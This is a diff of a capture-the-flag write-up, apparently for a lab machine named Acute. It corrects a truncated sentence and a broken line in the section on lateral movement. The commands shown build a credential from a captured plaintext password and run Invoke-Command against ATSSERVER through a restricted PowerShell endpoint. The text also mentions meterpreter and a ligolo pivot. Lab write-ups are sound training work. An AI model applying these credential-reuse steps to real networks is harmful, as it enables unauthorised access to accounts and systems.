@@ -432,7 +432,7 @@ There also isnt much in bloodhound
 
 # Command execution on `ATSSERVER` from `Acute-PC01`
 
-Since my meterpreter session is busy tuin
+Since my meterpreter session is busy running the ligolo agennt ill open a winrm session on `acute-pc01` as `edavies`
 
 ```python
 evil-winrm-py PS C:\Users\edavies\Documents> $pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
@@ -451,8 +451,7 @@ Ill use the credential object to run a command as that user on the ATSSERVER
 I used `dc_manage` because this was what `edavies` was using when i captured his credentials in the powershell session
 
 ```python
-evil-winrm-py PS C:\Users\edavies\Documents> Invoke-Command -ComputerName ATSSERVER -ScriptBlock {ls C:\Users\
-imonks\Desktop} -Credential $cred -ConfigurationName dc_manage
+evil-winrm-py PS C:\Users\edavies\Documents> Invoke-Command -ComputerName ATSSERVER -ScriptBlock {ls C:\Users\imonks\Desktop} -Credential $cred -ConfigurationName dc_manage
 
 
     Directory: C:\Users\imonks\Desktop
